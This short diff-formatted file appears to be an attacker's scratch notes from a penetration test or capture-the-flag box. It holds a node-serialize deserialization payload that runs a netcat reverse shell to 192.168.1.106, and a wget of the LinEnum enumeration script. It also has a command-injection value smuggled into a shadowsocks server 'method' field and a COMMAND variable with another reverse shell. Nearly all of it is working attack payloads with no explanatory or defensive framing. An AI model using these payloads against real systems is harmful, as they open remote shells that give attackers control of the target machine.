@@ -1,0 +1,13 @@
+&nbsp; &nbsp;at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16)<br>
+
+
+{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('nc -e /bin/sh 192.168.1.106 1234',(e,out,err)=>{console.log(out);}); }()"}fim
+
+wget https://github.com/rebootuser/LinEnum.git
+
+
+nc -u 127.0.0.1 8839
+add: {"server_port":8003, "password":"test", "method":"||nc -nv 192.168.1.106 4444 -e /bin/bash||"}
+
+
+COMMAND='nc -nv 192.168.1.106 8888 -e /bin/bash'
